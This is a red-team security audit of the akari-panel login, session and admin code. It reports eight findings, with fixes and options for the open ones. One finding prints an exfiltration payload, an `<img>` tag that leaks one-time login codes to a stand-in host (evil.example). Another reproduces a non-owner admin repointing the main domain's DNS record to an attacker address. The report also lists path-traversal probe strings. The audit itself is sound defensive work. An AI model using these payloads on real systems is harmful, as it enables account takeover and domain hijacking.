# Red team 2026-10 — Area A: front door, authentication, sessions

Target: akari-panel main a74a41b (v2.2.0 + docs). Method: white-box read of the code path, then route-level tests on a
local PG 18 / Redis stack (`testdb::http`), plus two table-driven sweeps run over every row of `src/route_auth.txt`
(scratch tests, not committed; results quoted below). Branch `rt-a-front-auth` (one panel PR, label `full-ci`).

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| A-1 | medium | `POST /auth/login/fallback/code` skipped the sign-in's bot protection (honeypot / min-submit-time / Turnstile) and answers differently for a right password → a password checker that bypasses the guard | fixed, test `botguard::tests::fallback_code_request_is_guarded_like_the_login` |
| A-2 | low | An admin's right password at the portal root was handed back to the login limiter, so the limiter itself told right from wrong after 20 tries (breaks "admin login = the wrong password's answer", D4) | fixed, test `access::tests::admin_password_at_the_root_is_counted_like_a_wrong_one` |
| A-3 | medium (decision) | Any admin (not only the owner) can rewrite DNS records of the panel's own main / subscription / node domains through the stored Cloudflare token | NOT fixed: product decision, options below |
| A-4 | low (decision) | A stolen session can add its own passkey and switch password login off without any re-authentication | NOT fixed: contradicts ruling R18 ("no extra steps"), options below |
| A-5 | low | Mail template HTML source (any admin) may contain `<img src="https://host/{code}">`: one-time codes leave in the image request when the client loads remote images | NOT fixed, option below |
| A-6 | info | Cookie `sid` has no `__Host-` prefix; the cross-site guard lets `same-site` through | note |
| A-7 | info | Admin-class API routes answer 401/403 (not the canonical 404) on the portal entry: route-existence oracle (no secret) | note |
| A-8 | info | CLAUDE.md still describes hosted rule sets (`/{sub_path}/rules/…`, `sub-rules`) that v2.2.0 removed | doc drift |

No critical or high finding. Everything else in scope held.

## Scope and verdicts

### 1. Front door and rejections — holds
- `access::route` is a pure function; `front` rewrites to `/_/…` and tags `Via`; `prefix_gate` refuses anything else.
  Existing tests: `access::tests::dispatch_table`, `web::tests::prefix_gate_rejections_are_byte_identical`,
  `access::tests::portal_at_the_root`, `admin_prefix_rotation_and_allowlist`.
- Probed (scratch, all byte-identical to the canonical 404 incl. no headers): percent-encoded prefix (`/%74est/…`,
  `%2f`, `%2e%2e`, `%00`), `//`, `/./`, trailing slash, other case, `;x`, backslash, `/_/…`, `/test/_/…`, public-only
  paths under the prefix (`/test/sub|install|pay…`), OPTIONS/TRACE/PATCH everywhere, wrong method on real routes.
  Dot segments are never normalised; axum matches the raw path, so `…/../…` cannot reach another route. (The 200s seen for
  `/shop/../x` and `/test/app/../x` are the portal index / sign-in page: the catch-all page routes, by design.)
- Host roles (`host_role`): IP literals and main domain serve everything; subscription domain only `Via::Sub`; node domain
  nothing; passkey centre only `/.well-known/webauthn`; `Route::Admin` only on the main role. Allow-list is evaluated on
  `state.client_ip` (XFF only from trusted peers; `client_ip::tests`), an unreadable entry locks the prefix.
- Prefix compare is `ct_eq` (length leaks, i.e. nothing useful: 96-bit default). `sub_path` uses `==` (info: not secret
  enough to matter over a network).
- Portal never reveals the prefix: `/auth/options`, `/healthz`, `/me`, index HTML checked; the only emitters of the prefix are
  admin-only (`settings/access`, console HTML). Admin sessions on the portal entry → canonical 404 (`auth::session`).
- Admin handlers: every one of the 217 `admin`-class handlers starts with `user.require_admin()?` as its first statement
  (scripted check on the source, beyond what `route_auth_tests` verifies, which only looks for the substring).
- A-7: on the portal entry the internal `/_/api/v1/users` etc. exist, so an anonymous visitor gets 401 and a user 403
  where `/api/v1/zzz` gets 404. Reveals only which admin API paths exist. Option: serve admin-class routes on `Via::Portal`
  as `reject::not_found()` (needs a per-route class at dispatch time, or a `Via::Portal` check in `require_admin`).

### 2. Token endpoints — holds
- Subscription: rate limit by client, shape check, SHA-256 lookup, per-user limit, every failure `reject::not_found()`.
- Install link / binary: per-address limit (fails open on Valkey error, no local fallback unlike enrol/sub: info), shape,
  hash lookup that only matches a live link, `ct_eq` on the stored hash.
- Password reset: request is the same answer for every address (work after the response), link in the fragment, main
  domain from settings, 256-bit token hashed, single use by conditional UPDATE, bound to the mailed address, wrong/old
  link refused before argon2 (`token_usable`). Registration/e-mail-change codes: HMAC, 5 tries, single use under row lock.
- Enrolment: CSR first, hash lookup, uniform PERMISSION_DENIED, source+global limits.
- Ticket / announcement / article ids: sweep over all `/me/*/{id}` routes with malformed and unknown ids — tickets,
  announcements, help articles, passkeys are the canonical 404 or body-first 400 (no oracle). Orders and withdrawals are
  owner-scoped and answer a coded 404 / an axum plain-text 400 for malformed ids (info: not claimed canonical).

### 3. Login and sessions — holds (A-1/A-2 fixed)
- Equal work: unknown, disabled, passwordless, banned-admin, trapped and wrong-password attempts do one query + one argon2
  (`scrub_password`); busy answers release the reservation. JWT: HS256 pinned, role read from the DB, `sv` compared.
- Buckets: address (/64), (name, network), name; atomic Lua reservation; success/other errors release (the only
  exception was A-2).
- session_ver: trigger on password / role / enabled→false / expiry_enforced; explicit bump on logout, revoke-sessions,
  reset-login; JWT secret rotation. Tests `api::tests::logout_revokes_copies_of_the_cookie`, `w28c_tests`.
- Scope matrix (scratch sweep, 9 session kinds × every route of `route_auth.txt`): anonymous 401; banned → 403
  `account.banned` on admin/user/shop routes and 200 only on `portal` routes; pending → 403 `account.email_required` on
  everything except `portal` GET /me, ticket create/reply bodies (which refuse it themselves) and the two bind routes;
  expired → 200 only on shop+portal; quota-disabled same; erased/stale-sv/disabled → 401; admin sessions on the portal
  entry → canonical 404 on every route; non-admin hitting admin routes → 403. No deviation.
- Cross-site guard (`web::cross_site_guard`, test `cross_site_state_changes_with_a_session_are_refused`) and HSTS rules
  (`web::tests` HSTS cases: only behind a trusted proxy that forwards https and with `cookie_secure`) hold. A-6 notes.

### 4. Passkeys and fallback login — holds (A-1 fixed, A-4 decision)
- Ceremony state: 256-bit key, 5 min, `GETDEL` (single use), registration/reauth state carries the user id and RP id and
  is compared; login state carries the RP id. Credential lookup is (rp_id, cred_id, user_id) under `FOR UPDATE` — a
  forged user handle cannot select another account's credential.
- Related origins/RP: allowed origins come from settings only (never the Host header); centre serves only the well-known file.
- Password refusal only after the right password and only with a current-RP passkey; deleting the last passkey of a
  passwordless account is refused under a user-row lock; `set_password_login(false)` and `delete` serialise on the same row.
- Fallback codes: HMAC, 10 min, single use, 5 wrong tries burn the code, bound to the verified address, wrong code counted.
  A-1 was the missing bot guard on the code-request endpoint.
- A-4: `POST /me/passkeys/options` + `POST /me/passkeys` (with `disable_password: true`) need only the session. A stolen
  session can plant a persistent passkey (survives password change, `session_ver` bumps do not remove it) and lock the
  owner out of password login (they must use the fallback code or `reset-login`). Mitigation today: `security_notice`
  mail. R18 forbids extra steps, so not changed. Options: (a) require `confirm_holder` (password or passkey) for adding
  a passkey / `disable_password`; (b) require it only for `disable_password` and for adding when the account has a
  password; (c) keep, but bump `session_ver` of other sessions when a passkey is added.

### 5. Owner and admin guards — holds, A-3
- Enumerated all user-targeting admin routes (`/users/{id}…`, batch, delete, ban/unban, sub-token, revoke-sessions,
  login-method/reset, email/verify, PATCH): every mutator reaches `owner::guard_target` (or `require` for owner-only
  actions); batch jobs keep the creator's actor id and skip admin accounts. Owner-only settings: `owner::tests`
  (`trust_settings_are_owner_only`). Info: `guard_target` reads the target's role without a lock, so a target promoted
  to admin between the check and the write is judged as a user (needs the owner to act at the same instant).
- A-3 reproduction (route-level, mock Cloudflare, `dns::tests` harness): owner stores a token (`POST /dns/accounts`), the
  zone holds `A panel.example.test` which is the main domain; a plain admin (`db.admin()`, not owner) sends
  `PUT /dns/accounts/{acc}/zones/{zone}/records/{id}` `{type:"A", name:"panel.example.test", content:"198.51.100.66",
  proxied:false, confirm:true}` → 200 and the mock's record now points to the attacker address. `POST /dns/link` likewise.
  Accounts are owner-only, records are "any admin" by design (CLAUDE.md), but this lets a non-owner do what R47
  forbids (change where the main domain points). Options: (a) record writes and `dns/link` owner-only; (b) owner-only only
  for records with `uses` (the panel's own domains) — reads and other records stay open; (c) keep and document that a DNS
  token delegates domain control to every admin.

### 6. Registration, reset, e-mail binding, invites, bot guard — holds (A-1, A-5)
- Registration (verified and unverified), passkey registration, pending accounts (24 h purge, 403 everywhere but binding),
  e-mail change (password/passkey confirmation, same answer for taken addresses, address lock, `security_notice` to the old
  address), invite codes (10 chars of a 32-letter alphabet = 50 bits; conditional UPDATE consume; `usable` is unthrottled
  but infeasible to brute force), PoW (HMAC, TTL, Valkey single use, fail closed).
- Bot guard: trap = the form's ordinary failure; Turnstile fails closed (`classify`); form tokens are stateless and
  reusable for 24 h (by design). Only the sign-in and the fallback code request check passwords, and now both go through
  `api::guard_password_form`.
- A-5 reproduction: `templates::validate_html("login_code", r#"<p>{code}</p><img src="https://evil.example/c/{code}">"#)`
  is `Ok`; `render_source` keeps the placeholder expansion. Needs another factor to be useful (codes alone do not log in),
  so low. Option: forbid `<img>`/`url(` with placeholders in URL position, or forbid remote `src`/`href` in code-bearing
  kinds, or make mail templates owner-only.

## Fix details
- A-1: `api::guard_password_form` (new, shared) now wraps the former inline block of `api::login`; `login_fallback::request_code`
  calls it right after the reservation.
- A-2: the `Entry::refuses` branch in `api::login` and `login_fallback::request_code` keeps the slot (`attempt.fail()`),
  and the fallback endpoint now checks it inside the credential match (before release).
- Docs: CLAUDE.md (front door + fallback), src/CLAUDE.md, docs/REFERENCE.md. No new error codes, no migration.
- Verification: `cargo clippy --all-targets -D warnings`, `cargo fmt --check`, full `cargo test --locked`.

## Not covered / notes
- The first bullet of the brief was cut off after "case,"; the coordinator's follow-up message supplied the full scope, which is what is reported.
- One scratch sweep ran every admin route with an admin session on a throwaway DB; `POST /agent-updates/check` answered
  202 and may have made one read-only GET of our own GitHub release API. Nothing else left the machine.
